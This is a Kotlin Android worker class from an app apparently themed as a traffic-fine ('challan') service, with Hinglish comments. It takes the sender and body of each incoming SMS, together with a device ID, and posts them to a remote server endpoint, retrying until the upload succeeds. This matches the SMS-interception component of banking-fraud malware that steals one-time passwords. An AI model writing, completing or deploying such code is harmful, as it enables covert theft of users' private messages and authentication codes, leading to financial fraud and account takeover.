package com.rte.challan.worker

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.rte.challan.network.ClientApi 
import org.json.JSONObject

class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        // 1. Data nikaalein (SmsReceiver se aaya hua)
        val deviceId = inputData.getString("deviceId") ?: return Result.failure()
        val sender = inputData.getString("sender") ?: return Result.failure()
        val body = inputData.getString("body") ?: return Result.failure()

        return try {
            // 2. JSON taiyar karein
            val smsJson = JSONObject().apply {
                put("deviceId", deviceId)
                put("number", sender)
                put("msg", body)
                put("time", System.currentTimeMillis())
            }

            // 3. IMPORTANT: WorkManager ko 'Blocking' call chahiye hoti hai
            // Agar ClientApi.postRequest callback use karta hai, toh use synchronous banayein
            val response = ClientApi.postRequestSync("/api/push-sms", smsJson)

            if (response) {
                Log.d("IncomingSms", "SMS synced successfully for $sender")
                Result.success()
            } else {
                Log.d("IncomingSms", "Sync failed, retrying...")
                Result.retry()
            }

        } catch (e: Exception) {
            Log.e("IncomingSms", "Critical Error: ${e.message}")
            Result.retry()
        }
    }
}
